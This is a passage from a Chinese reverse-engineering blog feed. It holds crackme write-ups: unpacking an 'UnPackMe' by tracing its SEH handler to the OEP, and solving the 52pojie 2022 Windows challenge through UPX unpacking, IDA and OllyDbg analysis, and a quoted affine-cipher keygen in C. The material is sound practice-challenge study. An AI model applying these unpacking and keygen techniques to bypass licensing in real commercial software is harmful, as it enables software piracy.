BB550000     jmp UnPackMe.0040FCB4</span><br></pre></td></tr></table></figure><p>忽略除非法内存访问的所有异常，在StrongOD中取消勾选“跳过某些异常”。重载，F9运行。程序停在空白代码处。</p><p>方法一：此时堆栈窗口显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0012EBE0   0012EC70  指向下一个 SEH 记录的指针</span><br><span class="line">0012EBE4   0040CA2C  SE处理程序</span><br></pre></td></tr></table></figure><p>在反汇编窗口Ctrl+G，跟随SE句柄。F2下断，Shift+F9运行，取消断点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040CA2C    55              push ebp</span><br><span class="line">0040CA2D    8BEC            mov ebp,esp</span><br><span class="line">0040CA2F    57              push edi</span><br></pre></td></tr></table></figure><p>F8往下，走到此处EDI的值就是OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040CA55    3E:89B8 B800000&gt;mov dword ptr ds:[eax+0xB8],edi          ; UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>Ctrl+G跟随<code>401700</code>到达OEP。脱壳，一定要修正镜像大小。这个程序是有涉及到锁键盘、锁任务栏的，但可以用这种方法巧妙绕过。</p><p>方法二：在<code>M</code>模块<code>.text</code>处下断，Shift+F9也能运行到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040CA2C    55              push ebp</span><br><span class="line">0040CA2D    8BEC            mov ebp,esp</span><br><span class="line">0040CA2F    57              push edi</span><br></pre></td></tr></table></figure><p>往后操作一样。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-程序是什么语言编译的&quot;&gt;&lt;a href=&quot;#1-程序是什么语言编译的&quot; class=&quot;headerlink&quot; title=&quot;1. 程序是什么语言编译的&quot;&gt;&lt;/a&gt;1. 程序是什么语言编译的&lt;/h1&gt;&lt;p&gt;从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些实例，结合实例来看看“入口点代码”、“程序区段”和“加载模块”等特征。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    <category term="脱壳" scheme="http://example.com/tags/%E8%84%B1%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解2022春节——Windows中级题</title>
    <link href="http://example.com/posts/5ada4708.html"/>
    <id>http://example.com/posts/5ada4708.html</id>
    <published>2022-04-05T01:29:28.052Z</published>
    <updated>2022-04-11T05:25:46.594Z</updated>
    
    <content type="html"><![CDATA[<p>拿到程序的第一时间运行一下，熟悉一下程序的流程。这个程序的流程是要我们输入UID和key。用PE工具查一下壳，发现有UPX壳，用ESP定律即可脱壳。验证程序是否脱壳成功，可载入OD看是否能查询到字符串，或载入IDA查看是否有函数或是否可以反编译出伪代码。脱壳后还要保证程序与未脱壳程序执行的流程要一致。</p><span id="more"></span><h1 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="built_in">SetConsoleTitleA</span>(<span class="string">&quot;【2022春节】解题领红包之三&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Input your UID: &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_402800</span>(&amp;v27);</span><br><span class="line">  <span class="keyword">if</span> ( v27 &gt; <span class="number">2000000</span> )                          <span class="comment">// v27 == UID,不能大于2000000</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Invalid UID, please input again.&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_402660</span>(<span class="number">10</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Input your Key: &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_403BC0</span>(&amp;dword_41DE60, &amp;v29);              <span class="comment">// v29 == key</span></span><br><span class="line">  v8 = <span class="built_in">sub_401100</span>(v27);                         <span class="comment">// v8 = UID % 25</span></span><br><span class="line">  v9 = <span class="built_in">sub_401080</span>(v27);                         <span class="comment">// v9 = map[UID % 12]</span></span><br><span class="line">  v25 = <span class="built_in">sub_401110</span>(v9);                         <span class="comment">// 与v9有关，即与map[UID % 12]有关</span></span><br><span class="line">  v24 = v8;                                     <span class="comment">// v24 = v8 = UID % 25</span></span><br><span class="line">  v28 = &amp;v20;</span><br><span class="line">  <span class="built_in">sub_402460</span>((<span class="type">int</span>)&amp;v20, (<span class="type">int</span>)&amp;v29);             <span class="comment">// v20 = v29 = key</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401520</span>(v20, v21, v22, v23, v24, v25) == <span class="number">1</span> )<span class="comment">// 与key, UID % 12和UID % 25有关，关键函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="built_in">sub_403930</span>((<span class="type">int</span>)dword_41DDD0, <span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_402660</span>(<span class="number">10</span>);</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_401100</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 % <span class="number">25</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_401080</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [sp+0h] [bp-30h]@1</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+4h] [bp-2Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+8h] [bp-28h]@1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+Ch] [bp-24h]@1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+10h] [bp-20h]@1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+14h] [bp-1Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+18h] [bp-18h]@1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+1Ch] [bp-14h]@1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+20h] [bp-10h]@1</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+24h] [bp-Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+28h] [bp-8h]@1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+2Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="number">3</span>;</span><br><span class="line">  v4 = <span class="number">5</span>;</span><br><span class="line">  v5 = <span class="number">7</span>;</span><br><span class="line">  v6 = <span class="number">9</span>;</span><br><span class="line">  v7 = <span class="number">11</span>;</span><br><span class="line">  v8 = <span class="number">15</span>;</span><br><span class="line">  v9 = <span class="number">17</span>;</span><br><span class="line">  v10 = <span class="number">19</span>;</span><br><span class="line">  v11 = <span class="number">21</span>;</span><br><span class="line">  v12 = <span class="number">23</span>;</span><br><span class="line">  v13 = <span class="number">25</span>;</span><br><span class="line">  <span class="keyword">return</span> *(&amp;v2 + a1 % <span class="number">12</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __cdecl <span class="title">sub_401520</span><span class="params">(<span class="type">char</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">signed</span> <span class="type">int</span> a5, <span class="type">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v19 = v18;</span><br><span class="line">  std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_4034E0</span>(<span class="string">&quot;flag&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;flag&quot;</span>));   <span class="comment">// flag初始化</span></span><br><span class="line">  v23 = v18;</span><br><span class="line">  std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_4034E0</span>(&amp;dword_41A0F8, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;dword_41A0F8));</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">sub_402BE0</span>(&amp;dword_41A0B0, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;dword_41A0B0));<span class="comment">// flag初始化后：v19[]=flag&#123;Happy_New_Year_52Pojie_2022&#125;</span></span><br><span class="line">  v17 = a5;                                     <span class="comment">// v17 = UID % 25</span></span><br><span class="line">  v16 = a6;                                     <span class="comment">// v16 = map[UID % 12]</span></span><br><span class="line">  v51 = &amp;v12;</span><br><span class="line">  <span class="built_in">sub_402460</span>((<span class="type">int</span>)&amp;v12, (<span class="type">int</span>)&amp;a1);              <span class="comment">// v12 = a1 = key</span></span><br><span class="line">  <span class="built_in">sub_4011B0</span>((<span class="type">int</span>)&amp;v50, v12, v13, v14, v15, v16, v17);<span class="comment">// 这个关键函数的返回值存到v50[],也就是说我们输入的key要经过转换才能变成v19[]</span></span><br><span class="line">  <span class="built_in">LOBYTE</span>(v52) = <span class="number">29</span>;</span><br><span class="line">  v8 = <span class="built_in">sub_403ED0</span>((<span class="type">int</span>)&amp;v50, (<span class="type">int</span>)&amp;v19);        <span class="comment">// v8 == 0，字符串比较函数,比较v19[]与v50[]</span></span><br><span class="line">  <span class="built_in">LOBYTE</span>(v52) = <span class="number">28</span>;</span><br><span class="line">  v17 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )                                     <span class="comment">// v8 == 0</span></span><br><span class="line">  &#123;</span><br><span class="line">      ...</span><br><span class="line">          <span class="keyword">return</span> = <span class="number">0</span>;<span class="comment">// 返回0是错的，可以不看</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(v17);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v52) = <span class="number">27</span>;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v52) = <span class="number">26</span>;</span><br><span class="line">    ...</span><br><span class="line"> std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v52) = <span class="number">0</span>;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    v52 = <span class="number">-1</span>;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>sub_4011B0</code>里面的算法看伪代码太过复杂，想直观看到key变换成什么，可以用OllyDbg动态调试，直接看比较函数<code>sub_403ED0</code>出来的与原key比较。</p><h1 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h1><p>程序说的UID其实是吾爱论坛的UID，我看大牛们wp时百度了好久UID在哪里查看…</p><p>载入OD，输入自己的UID和随便的key，比如hhhhhhhhhhhh。输入完后去到<code>sub_401520</code>进去，再去到<code>sub_403ED0</code>下断运行至此处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401CB2    E8 F9F4FFFF     call dumped_.004011B0</span><br><span class="line">00401CB7    83C4 1C         add esp,0x1C;403ED0参数从这里开始</span><br><span class="line">00401CBA    8D4C24 10       lea ecx,dword ptr ss:[esp+0x10]</span><br><span class="line">00401CBE    C68424 EC010000&gt;mov byte ptr ss:[esp+0x1EC],0x1D</span><br><span class="line">00401CC6    51              push ecx;第二个参数入栈v19[]=flag&#123;Happy_New_Year_52Pojie_2022&#125;的首地址</span><br><span class="line">00401CC7    8D8C24 D4010000 lea ecx,dword ptr ss:[esp+0x1D4];第一个参数的首地址在ecx中(v50[])</span><br><span class="line">00401CCE    E8 FD210000     call dumped_.00403ED0</span><br></pre></td></tr></table></figure><p>为了验证入栈的是否是v19，可查看堆栈窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0012FD44   0012FD58;首地址为0012FD58</span><br><span class="line">0012FD48   006B5B28</span><br><span class="line">0012FD4C   00000017</span><br><span class="line">0012FD50   0012FFC0</span><br><span class="line">0012FD54   FFFFFFFF</span><br><span class="line">0012FD58   003200FF;但这个并不是v19,再下一个地址才是</span><br><span class="line">0012FD5C   00392009  ASCII &quot;flag&#123;Happy_New_Year_52Pojie_2022&#125;&quot;</span><br></pre></td></tr></table></figure><p>再找ecx-&gt;数据窗口中跟随，同理，第二个地址存放的是比较的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0012FF18  00 00 00 00 99 20 39 00 0C 00 00 00 1F 00 00 00  ....?9........</span><br></pre></td></tr></table></figure><p>继续数据窗口跟随，我们输入的“h”已经全变为“q”了。说明很有可能是单表替换中的移位密码，位数为9。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00392099  71 71 71 71 71 71 71 71 71 71 71 71 00 00 00 00  qqqqqqqqqqqq....</span><br></pre></td></tr></table></figure><p>再试多几次验证一下，发现不是移位密码！</p><p>happynewyear-&gt;qxiizktbztxg，只是普通的单表替换。</p><div class="table-container"><table><thead><tr><th>a</th><th>b</th><th>c</th><th>d</th><th>e</th><th>f</th><th>g</th><th>h</th><th>i</th><th>j</th><th>k</th><th>l</th><th>m</th><th>n</th><th>o</th><th>p</th><th>q</th><th>r</th><th>s</th><th>t</th></tr></thead><tbody><tr><td>x</td><td>w</td><td>v</td><td>u</td><td>t</td><td>s</td><td>r</td><td>q</td><td>p</td><td>o</td><td>n</td><td>m</td><td>l</td><td>k</td><td>j</td><td>i</td><td>h</td><td>g</td><td>f</td><td>e</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>u</th><th>v</th><th>w</th><th>x</th><th>y</th><th>z</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th></tr></thead><tbody><tr><td>d</td><td>c</td><td>b</td><td>a</td><td>z</td><td>y</td><td>X</td><td>W</td><td>V</td><td>U</td><td>T</td><td>S</td><td>R</td><td>Q</td><td>P</td><td>O</td><td>N</td><td>M</td><td>L</td><td>K</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>{</th><th>_</th><th>…</th></tr></thead><tbody><tr><td>J</td><td>I</td><td>H</td><td>G</td><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>Z</td><td>Y</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>{</td><td>_</td><td>…</td></tr></tbody></table></div><p>所以<code>flag&#123;Happy_New_Year_52Pojie_2022&#125;</code>逆过来就是<code>smxr&#123;Qxiiz_Ktb_Ztxg_52Ijopt_2022&#125;</code></p><img src="/posts/5ada4708/%E6%88%90%E5%8A%9F%E6%88%AA%E5%9B%BE.png" class="" title="成功"><p>注意，这个只是在我UID为1787123的情况下的替换表，UID不同替换表也不同。我看wp说这其实是仿射密码，也就是替换表与静态分析<code>map[UID % 12]</code>，<code>UID % 25</code>其实是有关系的。</p><p>会的还是太少了，仿射密码的加解密原理自行百度，这里不想写了，最后附上大牛的注册机：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> <span class="type">const</span> flag[] = <span class="string">&quot;flag&#123;Happy_New_Year_52Pojie_2022&#125;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="built_in">map</span>[] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">25</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uid;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;uid) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> A = <span class="built_in">map</span>[uid % <span class="number">12</span>];</span><br><span class="line">        <span class="type">int</span> B = uid % <span class="number">25</span>;</span><br><span class="line">        <span class="type">char</span> buf[<span class="keyword">sizeof</span>(flag)];</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, flag);</span><br><span class="line">        <span class="type">char</span> *p = buf;</span><br><span class="line">        <span class="keyword">while</span> (*p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;a&#x27;</span> &lt;= *p &amp;&amp; *p &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                *p = ((*p - <span class="string">&#x27;a&#x27;</span>) * A + B) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;A&#x27;</span> &lt;= *p &amp;&amp; *p &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                *p = ((*p - <span class="string">&#x27;A&#x27;</span>) * A + B) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ++p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;拿到程序的第一时间运行一下，熟悉一下程序的流程。这个程序的流程是要我们输入UID和key。用PE工具查一下壳，发现有UPX壳，用ESP定律即可脱壳。验证程序是否脱壳成功，可载入OD看是否能查询到字符串，或载入IDA查看是否有函数或是否可以反编译出伪代码。脱壳后还要保证程序与未脱壳程序执行的流程要一致。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解2022春节——Android中级题</title>
    <link href="http://example.com/posts/8b4ac9a8.html"/>
    <id>http://example.com/posts/8b4ac9a8.html</id>
    <published>2022-04-05T01:29:28.022Z</published>
    <updated>2022-04-11T05:25:42.851Z</updated>
    
    <content type="html"><![CDATA[<p>不会有人因为这道题所以去学了Android逆向吧？！！是的是我本人，为了能更好看懂Android程序还在寒假学了Java。所以这道题这么久才能跟你们见面。</p><span id="more"></span><p>在AK看到apk有lib文件，说明调用了so文件。是arm64-v8a架构的。完蛋了AS模拟器也运行不了arm64-v8a架构的。</p><img src="/posts/8b4ac9a8/1.png" class="" title="jeb简单分析"><p>先不管了，拖进IDA64看看情况。Native函数有两种定义方法，一种是按照类名函数名静态声明并导出，一种是在<code>JNI_OnLoad</code>里调用<code>vm -&gt; GetEnv -&gt; RegisterNatives</code>动态声明。看一眼它的导出表，发现并没有导出<code>checkSn</code>函数，那么就说明是<code>JNI_OnLoad</code>里动态注册的。</p><p>那…接下来就动态调试啦，要真机调试啊救命！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;不会有人因为这道题所以去学了Android逆向吧？！！是的是我本人，为了能更好看懂Android程序还在寒假学了Java。所以这道题这么久才能跟你们见面。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
    <category term="Android Killer" scheme="http://example.com/tags/Android-Killer/"/>
    
  </entry>
  
</feed>
